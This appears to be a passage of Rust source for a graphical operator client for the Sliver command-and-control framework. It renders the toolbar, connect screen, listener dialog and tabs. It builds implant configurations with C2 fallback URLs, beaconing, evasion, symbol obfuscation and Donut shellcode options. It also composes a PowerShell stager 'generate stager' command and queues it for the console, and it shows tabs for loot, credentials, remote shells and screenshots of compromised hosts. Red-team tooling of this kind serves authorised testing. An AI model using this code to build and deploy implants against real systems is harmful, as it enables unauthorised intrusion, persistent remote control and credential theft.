                        let mut f = builds::form_from_config(&p.config.unwrap_or_default(), dir.to_string());
                        f.name = format!("{name}-gui");
                        if let Some(w) = wg { f.mtls.clear(); f.wg = w.to_string(); }
                        let (config, n, d) = build_generate_request(&f);
                        self.push_event("info", &format!("GUI build requested from profile {name} ({} C2)", config.c2.len()));
                        self.send(Command::Generate { config, name: n, save_dir: Some(d) });
                    }
                }
            }
        }

        // Keep beacon consoles fed: poll task state for open beacon consoles
        // with outstanding work so completed results print automatically.
        let now = ctx.input(|i| i.time);
        if self.conn == ConnState::Connected && now - self.ext.beacon_poll_at > 4.0 {
            self.ext.beacon_poll_at = now;
            let open: Vec<String> = self.dock.iter_all_tabs()
                .filter_map(|(_, t)| if let Tab::Console(t) = t { t.is_beacon().then(|| t.beacon_id.clone()) } else { None })
                .collect();
            for bid in open {
                self.send(Command::RefreshBeaconTasks { beacon_id: bid });
            }
            ctx.request_repaint_after(std::time::Duration::from_secs(5));
        }
        // Sliver only re-evaluates "dead" when the lists are fetched, so poll them.
        if self.conn == ConnState::Connected && now - self.ext.list_poll_at > 30.0 {
            self.ext.list_poll_at = now;
            self.send(Command::RefreshAll);
            ctx.request_repaint_after(std::time::Duration::from_secs(30));
        }
        // Staged payloads: once the embedded Sliver Console is at a prompt, run the queued
        // `generate stager` there so the stub is built by sliver-client's own msfvenom.
        if self.ext.staged_stager_cmd.is_some() {
            let ready = self.ext.cli.as_mut().is_some_and(|t| {
                let alive = t.alive();
                let c = t.contents();
                alive && c.contains("sliver") && c.trim_end().ends_with('>')
            });
            if ready {
                let cmd = self.ext.staged_stager_cmd.take().unwrap_or_default();
                if let Some(t) = self.ext.cli.as_mut() { t.write(format!("{cmd}\r").as_bytes()); }
            }
            ctx.request_repaint_after(std::time::Duration::from_millis(300));
        }

        // Toolbar
        egui::TopBottomPanel::top("toolbar")
            .frame(egui::Frame::none().fill(Palette::bg()).inner_margin(egui::Margin::symmetric(10.0, 7.0))
                .stroke(egui::Stroke::new(1.0_f32, Palette::border())))
            .show(ctx, |ui| {
                self.toolbar(ui, ctx);
            });

        // Status bar
        egui::TopBottomPanel::bottom("statusbar")
            .frame(egui::Frame::none().fill(Palette::bg()).inner_margin(egui::Margin::symmetric(10.0, 4.0)))
            .show(ctx, |ui| self.status_bar(ui));

        if self.conn == ConnState::Connected {
            self.central_dock(ctx);
        } else {
            self.connect_screen(ctx);
        }

        self.modals(ctx);
        self.ext_modals(ctx);
        self.toast_overlay(ctx);
        self.maybe_screenshot(ctx);
        self.persist_settings(now, false);

        // Apply any tabs requested during this frame.
        let pending: Vec<Tab> = self.pending_open.drain(..).collect();
        for t in pending {
            self.open_tab(t);
        }

        if self.conn == ConnState::Connecting {
            ctx.request_repaint_after(std::time::Duration::from_millis(200));
        }
    }

    fn on_exit(&mut self, _gl: Option<&eframe::glow::Context>) {
        self.persist_settings(f64::MAX, true);
    }
}

impl SliverApp {
    /// Save settings when dirty (at most every 2 s), or immediately if `force`.
    fn persist_settings(&mut self, now: f64, force: bool) {
        if !force && (!self.settings_dirty || now - self.last_save < 2.0) { return; }
        self.last_save = now;
        self.settings_dirty = false;
        self.settings.graph_pos = self.graph_pos.iter().map(|(k, p)| (k.clone(), (p.x, p.y))).collect();
        let saved = self.dock.filter_map_tabs(|t| t.is_permanent().then(|| t.clone()));
        self.settings.dock = serde_json::to_value(&saved).ok();
        if let Err(e) = self.settings.save() {
            self.push_event("error", &format!("saving settings: {e:#}"));
        }
    }

    fn status_bar(&mut self, ui: &mut egui::Ui) {
        ui.horizontal(|ui| {
            let (dot, label) = match self.conn {
                ConnState::Connected => (Palette::green(), format!("connected · server {}", self.version)),
                ConnState::Connecting => (Palette::yellow(), "connecting…".into()),
                ConnState::Error => (Palette::red(), format!("error: {}", self.conn_error)),
                ConnState::Disconnected => (Palette::muted(), "disconnected".into()),
            };
            ui.colored_label(dot, "●");
            ui.colored_label(Palette::muted(), label);
            if self.conn == ConnState::Connected {
                if let Some(cfg) = self.configs.get(self.selected_cfg) {
                    ui.separator();
                    ui.colored_label(Palette::muted(), format!("as {}", cfg.label()));
                }
            }
            let hint = self.status_hint.take();
            self.shown_hint.set(hint);
            if let Some(hint) = hint {
                ui.separator();
                ui.colored_label(Palette::accent(), hint);
            }
            ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                let stat = |ui: &mut egui::Ui, n: usize, what: &str, c: egui::Color32| {
                    ui.label(egui::RichText::new(what).small().color(Palette::muted()));
                    ui.label(egui::RichText::new(n.to_string()).strong().color(if n > 0 { c } else { Palette::muted() }));
                };
                let iocs: usize = self.ext.hosts.iter().map(|h| h.io_cs.len()).sum();
                stat(ui, iocs, "open IOCs  ", Palette::yellow());
                stat(ui, self.ext.hosts.len(), "hosts  ", Palette::text());
                stat(ui, self.jobs.len(), "listeners  ", Palette::purple());
                stat(ui, self.beacons.len(), "beacons  ", Palette::accent());
                stat(ui, self.sessions.len(), "sessions  ", Palette::green());
            });
        });
    }

    fn toolbar(&mut self, ui: &mut egui::Ui, ctx: &egui::Context) {
        ui.horizontal(|ui| {
            ui.label(egui::RichText::new("◆").size(18.0).color(Palette::accent()));
            ui.heading(egui::RichText::new("SLIVER").color(Palette::text()).strong());
            ui.colored_label(Palette::muted(), egui::RichText::new("operator console").small());
            ui.separator();

            match self.conn {
                ConnState::Connected => {
                    if ui.button("⟳ Refresh").on_hover_text("Refresh sessions, beacons, listeners, hosts").clicked() {
                        self.send(Command::RefreshAll);
                        self.send(Command::RefreshPivots);
                        self.op(Op::RefreshHosts);
                    }
                    if ui.button("≡ Listeners").on_hover_text("Start a C2 listener").clicked() {
                        self.show_listeners = true;
                    }
                    if ui.button("✦ Generate").on_hover_text("Build an implant").clicked() {
                        self.show_generate = true;
                    }
                    ui.menu_button("⎙ Report", |ui| {
                        ui.checkbox(&mut self.report_secrets, "include credential secrets");
                        if ui.button("Export engagement report (Markdown)…").clicked() {
                            ui.close_menu();
                            self.export_report(self.report_secrets);
                        }
                        if ui.button("Export timeline (CSV)…").clicked() {
                            ui.close_menu();
                            self.export_events_csv();
                        }
                    });
                    ui.separator();
                    if ui.button(egui::RichText::new("✕ Disconnect").color(Palette::red())).clicked() {
                        self.disconnect();
                    }
                }
                ConnState::Connecting => {
                    ui.spinner();
                    ui.colored_label(Palette::yellow(), "establishing mTLS…");
                }
                _ => {
                    ui.colored_label(Palette::muted(), "select a profile below to connect");
                }
            }

            ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                if ui.button("⚙").on_hover_text("Settings").clicked() { self.ext.show_settings = true; }
                let light = self.settings.light_theme;
                if ui.button(if light { "☾" } else { "☀" }).on_hover_text(if light { "Dark theme" } else { "Light theme" }).clicked() {
                    self.settings.light_theme = !light;
                    crate::theme::apply(ctx, self.settings.light_theme);
                    self.settings_dirty = true;
                }
                if self.conn == ConnState::Connected {
                    ui.separator();
                    // Multiplayer presence: who else is connected to this server.
                    let online: Vec<&clientpb::Operator> = self.ext.operators.iter().filter(|o| o.online).collect();
                    let r = ui.menu_button(format!("👥 {}", online.len()), |ui| {
                        ui.label(egui::RichText::new("Operators").strong());
                        ui.separator();
                        for o in &self.ext.operators {
                            ui.horizontal(|ui| {
                                ui.colored_label(if o.online { Palette::green() } else { Palette::muted() }, "●");
                                ui.label(&o.name);
                                ui.colored_label(Palette::muted(), if o.online { "online" } else { "offline" });
                            });
                        }
                        if self.ext.operators.is_empty() { ui.colored_label(Palette::muted(), "no operator data"); }
                    });
                    r.response.on_hover_text("Operators online");
                    for o in online.iter().take(4) {
                        kit::badge(ui, &o.name, Palette::green());
                    }
                }
            });
        });
    }

    fn connect_screen(&mut self, ctx: &egui::Context) {
        egui::CentralPanel::default()
            .frame(egui::Frame::none().fill(Palette::bg()).inner_margin(40.0))
            .show(ctx, |ui| {
                ui.vertical_centered(|ui| {
                    ui.add_space(30.0);
                    ui.label(egui::RichText::new("◆").size(44.0).color(Palette::accent()));
                    ui.heading(egui::RichText::new("Sliver GUI").size(30.0).color(Palette::text()).strong());
                    ui.colored_label(Palette::muted(), "Graphical operator client for the Sliver C2 framework");
                    ui.add_space(20.0);
                });

                ui.vertical_centered(|ui| egui::Frame::none()
                    .fill(Palette::panel())
                    .rounding(10.0)
                    .stroke(egui::Stroke::new(1.0_f32, Palette::border()))
                    .shadow(ui.visuals().window_shadow)
                    .inner_margin(20.0)
                    .show(ui, |ui| {
                        ui.set_max_width(640.0);
                        ui.with_layout(egui::Layout::top_down(egui::Align::Min), |ui| {
                        ui.label(egui::RichText::new("Operator profiles").strong());
                        ui.colored_label(
                            Palette::muted(),
                            crate::config::default_config_dir()
                                .map(|p| p.display().to_string())
                                .unwrap_or_default(),
                        );
                        ui.add_space(6.0);

                        if self.configs.is_empty() {
                            ui.colored_label(Palette::yellow(), "No operator configs found.");
                            ui.label("Import a .cfg generated by `sliver-server operator` below.");
                        } else {
                            egui::ScrollArea::vertical().max_height(260.0).show(ui, |ui| {
                                for i in 0..self.configs.len() {
                                    let label = self.configs[i].label();
                                    let selected = i == self.selected_cfg;
                                    let r = ui.selectable_label(selected, egui::RichText::new(format!("  {}  {}", if selected { "●" } else { "○" }, label)).size(14.5));
                                    if r.clicked() {
                                        self.selected_cfg = i;
                                    }
                                    if r.double_clicked() {
                                        self.selected_cfg = i;
                                        self.connect(ctx);
                                    }
                                }
                            });
                        }

                        ui.add_space(10.0);
                        ui.horizontal(|ui| {
                            if ui.button("⊕ Import config…").clicked() {
                                if let Some(path) = rfd::FileDialog::new()
                                    .add_filter("Sliver config", &["cfg", "json"])
                                    .pick_file()
                                {
                                    match OperatorConfig::load_file(&path) {
                                        Ok(mut cfg) => {
                                            // Persist the import into the standard config dir so
                                            // the profile is still here next launch.
                                            if let Some(dir) = crate::config::default_config_dir() {
                                                let dest = dir.join(path.file_name().unwrap_or_default());
                                                if !dest.exists() {
                                                    let copied = std::fs::create_dir_all(&dir).and_then(|_| std::fs::copy(&path, &dest));
                                                    match copied {
                                                        Ok(_) => { cfg.source_path = Some(dest.clone()); self.set_toast(true, &format!("imported → {}", dest.display())); }
                                                        Err(e) => self.set_toast(false, &format!("loaded, but could not save to {}: {e}", dir.display())),
                                                    }
                                                }
                                            }
                                            if let Some(i) = self.configs.iter().position(|c| c.label() == cfg.label()) {
                                                self.selected_cfg = i;
                                            } else {
                                                self.configs.push(cfg);
                                                self.selected_cfg = self.configs.len() - 1;
                                            }
                                        }
                                        Err(e) => self.set_toast(false, &format!("load failed: {e}")),
                                    }
                                }
                            }
                            let can = !self.configs.is_empty();
                            if ui
                                .add_enabled(can, egui::Button::new(egui::RichText::new("▶ Connect").strong()))
                                .clicked()
                            {
                                self.connect(ctx);
                            }
                        });

                        if self.conn == ConnState::Error {
                            ui.add_space(8.0);
                            egui::Frame::none()
                                .fill(Palette::red().linear_multiply(0.12))
                                .stroke(egui::Stroke::new(1.0_f32, Palette::red().linear_multiply(0.5)))
                                .rounding(6.0)
                                .inner_margin(8.0)
                                .show(ui, |ui| { ui.colored_label(Palette::red(), &self.conn_error); });
                        }
                        });
                    }));
            });
    }

    fn central_dock(&mut self, ctx: &egui::Context) {
        // Move the dock out so the TabViewer can borrow the rest of `self`.
        let mut dock = std::mem::replace(&mut self.dock, DockState::new(Vec::new()));
        let mut viewer = Viewer { app: self };
        DockArea::new(&mut dock)
            .style(dock_style(ctx))
            .show_close_buttons(true)
            .show(ctx, &mut viewer);
        self.dock = dock;
    }

    fn modals(&mut self, ctx: &egui::Context) {
        // ---- Rename ----
        if let Some((target, _)) = self.rename_for.clone() {
            let mut open = true;
            let mut do_rename = false;
            egui::Window::new("Rename implant")
                .open(&mut open)
                .resizable(false)
                .collapsible(false)
                .show(ctx, |ui| {
                    if let Some((_, name)) = &mut self.rename_for {
                        ui.horizontal(|ui| {
                            ui.label("Name:");
                            let r = ui.text_edit_singleline(name);
                            if r.lost_focus() && ui.input(|i| i.key_pressed(egui::Key::Enter)) { do_rename = true; }
                        });
                    }
                    ui.horizontal(|ui| {
                        if ui.button("Rename").clicked() { do_rename = true; }
                        if ui.button("Cancel").clicked() { self.rename_for = None; }
                    });
                });
            if !open { self.rename_for = None; }
            if do_rename {
                if let Some((_, name)) = self.rename_for.take() {
                    if !name.trim().is_empty() {
                        self.send(Command::Rename { target, name });
                    }
                }
            }
        }

        // ---- Listeners ----
        let mut open = self.show_listeners;
        let title = match self.listener_form.editing { Some(id) => format!("Edit Listener — job {id}"), None => "Start Listener".into() };
        egui::Window::new(title)
            .id(egui::Id::new("listener-dialog"))
            .open(&mut open)
            .resizable(false)
            .collapsible(false)
            .show(ctx, |ui| {
                // The server's reachable address, for the stager command hint.
                let srv_lhost = self.configs.get(self.selected_cfg).map(|c| c.lhost.clone()).unwrap_or_default();
                let srv_key = self.server_key();
                let presets = self.settings.listener_presets.clone();
                let f = &mut self.listener_form;
                let mut save_preset = false;
                let mut del_preset: Option<String> = None;
                ui.horizontal(|ui| {
                    egui::ComboBox::from_id_salt("listener-preset")
                        .selected_text(if presets.is_empty() { "no presets".to_string() } else { "load preset…".to_string() })
                        .show_ui(ui, |ui| {
                            for p in &presets {
                                ui.horizontal(|ui| {
                                    if ui.selectable_label(false, &p.name).clicked() { f.load_preset(p); }
                                    if ui.small_button("✕").on_hover_text("Delete preset").clicked() { del_preset = Some(p.name.clone()); }
                                });
                            }
                        });
                    ui.add(egui::TextEdit::singleline(&mut f.preset_name).desired_width(120.0).hint_text("preset name"));
                    if ui.add_enabled(!f.preset_name.trim().is_empty(), egui::Button::new("Save preset")).clicked() { save_preset = true; }
                });
                ui.separator();
                egui::ComboBox::from_label("Protocol")
                    .selected_text(["mTLS", "HTTP(S)", "DNS", "Stage (TCP)", "WireGuard"][f.kind.min(4)])
                    .show_ui(ui, |ui| {
                        ui.selectable_value(&mut f.kind, 0, "mTLS");
                        ui.selectable_value(&mut f.kind, 1, "HTTP(S)");
                        ui.selectable_value(&mut f.kind, 2, "DNS");
                        ui.selectable_value(&mut f.kind, 3, "Stage (TCP)");
                        ui.selectable_value(&mut f.kind, 4, "WireGuard");
                    });
                ui.horizontal(|ui| {
                    ui.label(if f.kind == 3 { "Stage host" } else { "Host" });
                    ui.text_edit_singleline(&mut f.host);
                });
                ui.horizontal(|ui| {
                    ui.label(match f.kind { 3 => "Stage port", 4 => "UDP port", _ => "Port" });
                    ui.add(egui::DragValue::new(&mut f.port).range(1..=65535));
                });
                if f.kind == 4 {
                    ui.horizontal(|ui| {
                        ui.label("Tunnel comms port");
                        ui.add(egui::DragValue::new(&mut f.wg_nport).range(1..=65535));
                        ui.label("Key-exchange port");
                        ui.add(egui::DragValue::new(&mut f.wg_key_port).range(1..=65535));
                    }).response.on_hover_text("Ports inside the tunnel, not firewall ports; implants must be built with the same two.");
                    ui.colored_label(Palette::muted(), "Implants need a WireGuard C2 (wg://host:port) built against this listener.");
                }
                if f.kind == 1 || f.kind == 2 {
                    ui.horizontal(|ui| {
                        ui.label("Domain");
                        ui.text_edit_singleline(&mut f.domain);
                    });
                }
                if f.kind == 1 {
                    ui.checkbox(&mut f.secure, "HTTPS (TLS)");
                    if f.secure { certs::listener_cert_ui(ui, f, &srv_lhost); }
                    ui.horizontal(|ui| {
                        ui.label("Website");
                        ui.text_edit_singleline(&mut f.website)
                            .on_hover_text("Optional: serve this website's hosted files (Hosted Files tab) on this listener");
                        egui::ComboBox::from_id_salt("listener-website")
                            .selected_text("")
                            .width(24.0)
                            .show_ui(ui, |ui| {
                                for w in &self.websites {
                                    ui.selectable_value(&mut f.website, w.name.clone(), &w.name);
                                }
                            });
                    });
                }
                if f.kind == 3 {
                    ui.horizontal(|ui| {
                        ui.label("Implant mTLS C2");
                        ui.text_edit_singleline(&mut f.stage_c2)
                            .on_hover_text("host:port the staged implant calls back to (needs a running mTLS listener there)");
                    });
                    ui.colored_label(Palette::muted(),
                        "Serves a Windows/amd64 shellcode stage (Donut, encrypted per build) over TCP.");
                    // The PowerShell stager stub is produced by msfvenom in the
                    // Sliver console; surface the exact command to run there.
                    let lhost = if f.host == "0.0.0.0" || f.host.is_empty() {
                        if srv_lhost.is_empty() { "<server-ip>".to_string() } else { srv_lhost.clone() }
                    } else { f.host.clone() };
                    let cmd = format!("generate stager --lhost {lhost} --lport {} --protocol tcp --format powershell", f.port);
                    ui.add_space(4.0);
                    ui.label(egui::RichText::new("PowerShell stager (run in your Sliver console):").small());
                    ui.horizontal(|ui| {
                        ui.add(egui::TextEdit::singleline(&mut cmd.clone()).desired_width(360.0).font(egui::TextStyle::Monospace));
                        if ui.button("📋").on_hover_text("Copy to clipboard").clicked() {
                            ui.ctx().copy_text(cmd.clone());
                        }
                    });
                }
                ui.add_space(8.0);
                let can_start = (f.kind != 3 || !f.stage_c2.trim().is_empty()) && (f.kind != 1 || certs::cert_ready(f));
                let mut restart: Option<(u32, ListenerSpec, Option<ListenerSpec>, String)> = None;
                if let Some(id) = f.editing {
                    if !f.edit_known {
                        ui.colored_label(Palette::yellow(), match f.kind {
                            1 => "Not started from this GUI: Sliver doesn't report the bind host or website. Check them before saving.",
                            3 => "Not started from this GUI: Sliver doesn't report the stage's C2. Fill it in before saving.",
                            4 => "Not started from this GUI: Sliver doesn't report the bind host or tunnel ports (defaults shown). Check them before saving.",
                            _ => "Not started from this GUI: Sliver doesn't report the bind host. Check it before saving.",
                        });
                    }
                    let changed = f.to_preset("") != ListenerPreset { name: String::new(), ..f.edit_orig.clone() };
                    ui.horizontal(|ui| {
                        let save = ui.add_enabled(can_start && changed, egui::Button::new(egui::RichText::new("Save & restart").strong()))
                            .on_hover_text("Stops this listener, then starts it with these settings. Implants on it reconnect on their next attempt.")
                            .on_disabled_hover_text(if changed { "Fill in the required fields" } else { "No changes" });
                        if save.clicked() {
                            // Only fully known settings can be put back faithfully if the
                            // new ones fail to start.
                            let prev = f.edit_known.then(|| spec_of_preset(&f.edit_orig));
                            restart = Some((id, f.spec(), prev, listener_key(&srv_key, f.edit_orig.kind, f.edit_orig.port)));
                        }
                        if !changed { ui.colored_label(Palette::muted(), "no changes"); }
                    });
                } else if ui.add_enabled(can_start, egui::Button::new(egui::RichText::new("Start").strong())).clicked() {
                    let spec = f.spec();
                    self.send(Command::StartListener(spec));
                    self.show_listeners = false;
                }
                if let Some((job_id, spec, previous, old_key)) = restart {
                    self.settings.listener_specs.remove(&old_key);
                    self.settings_dirty = true;
                    self.set_toast(true, &format!("restarting listener job {job_id}…"));
                    self.send(Command::RestartListener { job_id, spec, previous });
                    self.show_listeners = false;
                }
                if save_preset {
                    let name = self.listener_form.preset_name.trim().to_string();
                    let preset = self.listener_form.to_preset(&name);
                    self.settings.listener_presets.retain(|p| p.name != name);
                    self.settings.listener_presets.push(preset);
                    self.settings_dirty = true;
                    self.set_toast(true, &format!("saved listener preset '{name}'"));
                }
                if let Some(name) = del_preset {
                    self.settings.listener_presets.retain(|p| p.name != name);
                    self.settings_dirty = true;
                }
            });
        if !open {
            self.show_listeners = false;
        }
        if !self.show_listeners { self.listener_form.editing = None; }

        // ---- Generate ----
        let mut gopen = self.show_generate;
        egui::Window::new("Generate Implant")
            .open(&mut gopen)
            .resizable(true)
            .default_width(480.0)
            .collapsible(false)
            .show(ctx, |ui| {
                self.generate_ui(ui);
            });
        if !gopen {
            self.show_generate = false;
        }
        if !self.show_generate {
            self.ext.gen_pivots_fetched = false;
        }
    }

    fn toast_overlay(&mut self, ctx: &egui::Context) {
        let Some((remaining, ok, text)) = self.toast.clone() else { return };
        let remaining = remaining - ctx.input(|i| i.stable_dt) as f64;
        if remaining <= 0.0 {
            self.toast = None;
            return;
        }
        self.toast = Some((remaining, ok, text.clone()));
        ctx.request_repaint_after(std::time::Duration::from_millis(100));

        // Raised card with the severity on a small mark (icon + outline), not a big fill.
        let tone = if ok { Palette::green() } else { Palette::red() };
        let resp = egui::Area::new(egui::Id::new("toast"))
            .anchor(egui::Align2::RIGHT_BOTTOM, egui::vec2(-16.0, -40.0))
            .show(ctx, |ui| {
                egui::Frame::none()
                    .fill(Palette::panel_hi())
                    .rounding(6.0)
                    .stroke(egui::Stroke::new(1.0_f32, tone.linear_multiply(0.8)))
                    .shadow(ctx.style().visuals.popup_shadow)
                    .inner_margin(egui::Margin::symmetric(12.0, 8.0))
                    .show(ui, |ui| {
                        ui.set_max_width(420.0);
                        ui.horizontal_top(|ui| {
                            ui.colored_label(tone, egui::RichText::new(if ok { "✓" } else { "✕" }).strong());
                            ui.add(egui::Label::new(text).wrap());
                        });
                    });
            })
            .response;
        if resp.interact(egui::Sense::click()).on_hover_text("click to dismiss").clicked() { self.toast = None; }
    }
}

/// Build an [`ImplantConfig`] + request from the generator form.
fn build_generate_request(f: &GenerateForm) -> (clientpb::ImplantConfig, String, String) {
    use generator::Transport;
    // The selected transport goes first; the rest are fallbacks in a fixed order.
    let order = std::iter::once(f.transport).chain(Transport::ALL.into_iter().filter(|t| *t != f.transport));
    let mut c2 = Vec::new();
    let mut used = std::collections::HashSet::new();
    for t in order {
        for raw in f.addr(t).split(',').map(str::trim).filter(|s| !s.is_empty()) {
            let url = match t {
                Transport::Mtls => {
                    let host = raw.trim_start_matches("mtls://");
                    if host.contains(':') { format!("mtls://{host}") } else { format!("mtls://{host}:8888") }
                }
                Transport::Http => {
                    if raw.starts_with("http://") || raw.starts_with("https://") { raw.to_string() } else { format!("https://{raw}") }
                }
                Transport::Dns => format!("dns://{}.", raw.trim_start_matches("dns://").trim_end_matches('.')),
                Transport::Wg => {
                    let host = raw.trim_start_matches("wg://");
                    if host.contains(':') { format!("wg://{host}") } else { format!("wg://{host}:53") }
                }
                Transport::TcpPivot => {
                    let host = raw.trim_start_matches("tcppivot://");
                    if host.contains(':') { format!("tcppivot://{host}") } else { format!("tcppivot://{host}:9898") }
                }
                Transport::NamedPipe => format!("namedpipe://{}", raw.trim_start_matches("namedpipe://")),
            };
            c2.push(clientpb::ImplantC2 { id: String::new(), priority: c2.len() as u32, url, options: String::new() });
            used.insert(t);
        }
    }
    let include_wg = used.contains(&Transport::Wg);

    let ns = 1_000_000_000i64;
    let config = clientpb::ImplantConfig {
        goos: f.os.clone(),
        goarch: f.arch.clone(),
        format: f.format,
        is_beacon: f.is_beacon,
        beacon_interval: f.beacon_interval * ns,
        beacon_jitter: f.beacon_jitter * ns,
        is_shared_lib: f.format == 0,
        is_shellcode: f.format == 1,
        is_service: f.format == 3,
        debug: f.debug,
        evasion: f.evasion,
        // WireGuard implants silently fail to finish the key exchange when symbol
        // obfuscation is on (upstream garble bug) — on every OS — so never obfuscate WG.
        obfuscate_symbols: f.obfuscate_symbols && !include_wg,
        // Donut options apply only to Windows shellcode output; a fresh
        // symmetric key per build (entropy 3) makes the bytes vary each time.
        shellcode_config: if f.format == 1 {
            Some(clientpb::ShellcodeConfig {
                entropy: f.sc_entropy,
                compress: f.sc_compress,
                ..Default::default()
            })
        } else {
            None
        },
        c2,
        include_mtls: used.contains(&Transport::Mtls),
        include_http: used.contains(&Transport::Http),
        include_dns: used.contains(&Transport::Dns),
        include_wg,
        include_tcp: used.contains(&Transport::TcpPivot),
        include_name_pipe: used.contains(&Transport::NamedPipe),
        // The worker requests a unique tunnel IP at build time.
        wg_key_exchange_port: if include_wg { f.wg_key_port } else { 0 },
        wg_tcp_comms_port: if include_wg { f.wg_comms_port } else { 0 },
        canary_domains: f.canary.split(',').map(|d| d.trim().trim_end_matches('.').to_string()).filter(|d| !d.is_empty()).collect(),
        limit_hostname: f.limit_hostname.trim().to_string(),
        limit_username: f.limit_username.trim().to_string(),
        limit_domain_joined: f.limit_domain_joined,
        limit_datetime: f.limit_datetime.trim().to_string(),
        reconnect_interval: 60 * ns,
        max_connection_errors: 1000,
        poll_timeout: 360 * ns,
        template_name: "sliver".into(),
        httpc2_config_name: if f.c2_profile.trim().is_empty() { "default".into() } else { f.c2_profile.trim().to_string() },
        connection_strategy: String::new(),
        ..Default::default()
    };
    (config, f.name.clone(), f.save_dir.clone())
}

// ---------------------------------------------------------------------------
// Tab rendering
// ---------------------------------------------------------------------------

struct Viewer<'a> {
    app: &'a mut SliverApp,
}

impl<'a> TabViewer for Viewer<'a> {
    type Tab = Tab;

    fn title(&mut self, tab: &mut Tab) -> egui::WidgetText {
        match tab {
            Tab::Sessions => format!("◉ Implants ({})", self.app.sessions.len() + self.app.beacons.len()).into(),
            Tab::Jobs => format!("≡ Listeners ({})", self.app.jobs.len()).into(),
            Tab::Events => "☰ Event Log".into(),
            Tab::Graph => "⑂ Session Graph".into(),
            Tab::Loot => format!("⛁ Loot ({})", self.app.loot.len()).into(),
            Tab::Creds => format!("⚿ Credentials ({})", self.app.creds.len()).into(),
            Tab::Armory => "⬢ Armory".into(),
            Tab::Console(t) => format!("▸ {} console", self.app.display(t)).into(),
            Tab::Files(t) => format!("▸ {}", self.app.display(t)).into(),
            Tab::Screenshot(t) => format!("▣ {}", self.app.display(t)).into(),
            Tab::Modules(t) => format!("✦ {} modules", self.app.display(t)).into(),
            Tab::Shell(id) => {
                let name = self.app.shells.get(id).map(|s| self.app.display(&s.target)).unwrap_or_default();
                format!("❯_ {name} shell").into()
            }
            Tab::BeaconTasks(bid) => {
                let name = self.app.names.get(bid).cloned().unwrap_or_else(|| short(bid).to_string());
                format!("≡ {name} tasks").into()
            }
            Tab::Pivoting => "⇄ Pivoting".into(),
            Tab::Hosting => "⇪ Hosted Files".into(),
            Tab::Server => "🖧 Server".into(),
            Tab::LocalTerm => "⌨ Local Terminal".into(),
            Tab::ServerCli => "❯_ Sliver Console".into(),
            Tab::Processes(t) => format!("⚙ {} processes", self.app.display(t)).into(),
            Tab::Registry(t) => format!("⊞ {} registry", self.app.display(t)).into(),
            Tab::Services(t) => format!("⊞ {} services", self.app.display(t)).into(),
            Tab::Builds => format!("◈ Builds ({})", self.app.ext.builds.len()).into(),
            Tab::Hosts => format!("🖧 Hosts ({})", self.app.ext.hosts.len()).into(),
            Tab::Gallery => format!("▣ Screenshots ({})", self.app.settings.shots.len()).into(),
        }
    }

    fn id(&mut self, tab: &mut Tab) -> egui::Id {
        match tab {
            Tab::Sessions => egui::Id::new("tab-sessions"),
            Tab::Jobs => egui::Id::new("tab-jobs"),
            Tab::Events => egui::Id::new("tab-events"),
            Tab::Graph => egui::Id::new("tab-graph"),
            Tab::Loot => egui::Id::new("tab-loot"),
            Tab::Creds => egui::Id::new("tab-creds"),
            Tab::Armory => egui::Id::new("tab-armory"),
            Tab::Console(t) => egui::Id::new(("tab-console", t.key())),
            Tab::Files(t) => egui::Id::new(("tab-files", t.key())),
            Tab::Screenshot(t) => egui::Id::new(("tab-shot", t.key())),
            Tab::Modules(t) => egui::Id::new(("tab-modules", t.key())),
            Tab::Shell(id) => egui::Id::new(("tab-shell", *id)),
            Tab::BeaconTasks(bid) => egui::Id::new(("tab-btasks", bid.clone())),
            Tab::Pivoting => egui::Id::new("tab-pivoting"),
            Tab::Hosting => egui::Id::new("tab-hosting"),
            Tab::Server => egui::Id::new("tab-server"),
            Tab::LocalTerm => egui::Id::new("tab-localterm"),
            Tab::ServerCli => egui::Id::new("tab-server-cli"),
            Tab::Processes(t) => egui::Id::new(("tab-procs", t.key())),
            Tab::Registry(t) => egui::Id::new(("tab-registry", t.key())),
            Tab::Services(t) => egui::Id::new(("tab-services", t.key())),
            Tab::Builds => egui::Id::new("tab-builds"),
            Tab::Hosts => egui::Id::new("tab-hosts"),
            Tab::Gallery => egui::Id::new("tab-gallery"),
        }
    }

    fn closeable(&mut self, tab: &mut Tab) -> bool {
        !tab.is_permanent()
    }

    fn on_close(&mut self, tab: &mut Tab) -> bool {
        if let Tab::Shell(id) = tab {
            let session_id = self.app.shells.get(id).map(|s| s.target.session_id.clone()).unwrap_or_default();
            self.app.send(Command::CloseShell { tunnel_id: *id, session_id });
            self.app.shells.remove(id);
        }
        true
    }

    fn ui(&mut self, ui: &mut egui::Ui, tab: &mut Tab) {
        match tab {
            Tab::Sessions => self.app.implants_tab(ui),
            Tab::Jobs => self.app.jobs_tab(ui),
            Tab::Events => self.app.events_tab(ui),
            Tab::Graph => self.app.graph_tab(ui),
            Tab::Loot => self.app.loot_tab(ui),
            Tab::Creds => self.app.creds_tab(ui),
            Tab::Armory => self.app.armory_tab(ui),
            Tab::Console(t) => self.app.console_tab(ui, t.clone()),
            Tab::Files(t) => self.app.files_tab(ui, t.clone()),
            Tab::Screenshot(t) => self.app.screenshot_tab(ui, t.clone()),
            Tab::Modules(t) => self.app.modules_tab(ui, t.clone()),
            Tab::Shell(id) => self.app.shell_tab(ui, *id),
            Tab::BeaconTasks(bid) => self.app.beacon_tasks_tab(ui, bid.clone()),
            Tab::Pivoting => self.app.pivoting_tab(ui),
            Tab::Hosting => self.app.hosting_tab(ui),
            Tab::Server => self.app.server_tab(ui),
            Tab::LocalTerm => self.app.local_term_tab(ui),
            Tab::ServerCli => self.app.server_cli_tab(ui),
            Tab::Processes(t) => self.app.processes_tab(ui, t.clone()),
            Tab::Registry(t) => self.app.registry_tab(ui, t.clone()),
            Tab::Services(t) => self.app.services_tab(ui, t.clone()),
            Tab::Builds => self.app.builds_tab(ui),
            Tab::Hosts => self.app.hosts_tab(ui),
            Tab::Gallery => self.app.gallery_tab(ui),
        }
    }
}

impl SliverApp {
    fn display(&self, t: &Target) -> String {
        let key = t.key();
        let name = self.names.get(&key).cloned().unwrap_or_default();
        if name.is_empty() {
            short(&key).to_string()
        } else {
            format!("{} {}", short(&key), name)
        }
    }

    fn implants_tab(&mut self, ui: &mut egui::Ui) {
        use egui_extras::Column;
        if self.sessions.is_empty() && self.beacons.is_empty() {
            kit::empty(ui, "\u{25c9}", "No implants connected", "Start a listener and deploy an implant — sessions and beacons appear here");
            return;
        }
